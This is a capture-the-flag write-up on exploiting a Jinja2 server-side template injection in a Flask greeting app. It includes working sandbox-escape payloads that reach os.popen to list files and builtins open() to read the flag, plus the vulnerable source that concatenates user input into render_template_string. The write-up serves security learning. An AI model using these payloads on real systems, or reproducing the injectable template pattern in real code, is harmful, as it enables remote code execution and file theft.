The app has probably a Jinja2 SSTI, since the name-part of the code gets executed, e.g. check

`https://bluehens-cat-the-flask-patched.chals.io/greeting/{{1+1}}`

This returns "Welcome 2", so we know that `1+1`has been evaluated to 2.

As a result, we want to use this code execution to cat the flag (as stated in the task).

Notice, that we cannot just call e.g. ``{{open('flag.txt')}}`` since the Jinja2 Functions are sandboxed and you can only call a subset of all python functions.

Googling around I found [this website](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti). There you can read how to escape the sandbox.
I first let me tell all the files in the challenge directory:

`https://bluehens-cat-the-flask-patched.chals.io/greeting/{{config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read()}}`

which returns

`Hello chall.py flag1.txt requirements.txt sum_suckers_creds!`

Now lets print flag1.txt:

`https://bluehens-cat-the-flask-patched.chals.io/greeting/{{ request.__class__._load_form_data.__globals__.__builtins__.open("flag1.txt").read() }}`

which gives us the **flag** `UDCTF{l4y3r_1_c0mpl3t3_g00d_luck_w1th_p4rt_2}` !

(besides if we print chall.py we get:
```python
from flask import Flask, render_template_string
from random import choice
app = Flask(__name__)
@app.route("/")
def home():
  return "USAGE: /greeting/:name"
@app.route("/greeting/<name>")
def greeting(name):
  greeting = choice(["Hi", "Hello", "Welcome"])
  template = ''' <!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8" /> <title>Greeting</title> </head> <body> <h1>''' + greeting + ' ' + name + '''!</h1> </body> </html>'''
  return render_template_string(template)
  
if __name__ == '__main__':
  #app.run(debug=True,port=8080)
  app.run(debug=True,host="0.0.0.0",port=8080)
```
so we can see that the error exists by using greeting and name directly in render_template_string.
  
